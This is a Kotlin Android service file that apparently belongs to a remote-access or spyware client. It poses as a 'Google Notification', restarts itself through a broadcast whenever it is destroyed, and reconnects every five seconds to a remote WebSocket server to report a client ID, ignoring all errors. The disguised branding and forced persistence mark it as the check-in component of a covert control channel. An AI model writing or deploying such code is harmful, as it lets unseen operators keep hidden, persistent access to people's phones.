package com.ot.grhq.client

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.ot.grhq.client.functionality.Utils
import org.json.JSONObject
import java.net.URI


class ForegroundService : Service() {

    private val TAG = "Foreground Service"
    private var client: WebSocketClient? = null

    var isConnected = false
    private val SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice"
    private val handler = Handler(Looper.getMainLooper())
    private val interval: Long =  5000
    private val task = object: Runnable {
        override fun run() {
            try {
                if (!isConnected) {
                    try {
                        connectToWebSocket()
                    } catch (e: Exception) {
                    }
                }
                updateWebSocketID()
            } catch (e: Exception) {
            }

            handler.postDelayed(this, interval)
        }
    }

    // Broadcast receiver to stop service
    private val broadcaster: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "STOP_SERVICE") {
                stopForeground(true)
                stopSelf()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")

//        registerReceiver(broadcaster, IntentFilter("STOP_SERVICE"))

        // Create notification channel
        val channelId = "Google notification"
        val channelName = "Google Notifications"
        val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_HIGH)
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
        val notification: Notification = NotificationCompat.Builder(getApplicationContext(), channelId)
                .setContentTitle("Google Notification")
                .setContentText("")
                .setSmallIcon(R.mipmap.ic_launcher).build()
        startForeground(1, notification)
        handler.post(task)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
//        unregisterReceiver(broadcaster)
        val restartService = Intent(SERVICE_RESTART_INTENT)
        sendBroadcast(restartService)
        Log.i(TAG, "Service destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    @Throws(java.lang.Exception::class)
    private fun connectToWebSocket() {
        client = WebSocketClient(applicationContext, URI(Utils.WEB_SOCKET_SERVER))
        client!!.connect()
        isConnected = true
    }

    @Throws(java.lang.Exception::class)
    private fun updateWebSocketID() {
        if (client?.isOpen == true) {
            val json = JSONObject()
            json.put("id", Utils.clientID(applicationContext))
            json.put("type", "client")
            json.put("res", "id")
            client?.send(json.toString())
        }
    }
}